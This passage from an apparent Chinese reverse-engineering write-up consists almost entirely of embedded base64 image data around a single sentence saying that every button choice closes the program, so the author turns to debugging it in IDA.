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'/></p>
<p>发现三个按钮选择选哪一个都会导致程序直接关闭，果断ida调试</p>
<p><img src='data:img/jpg;base64,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
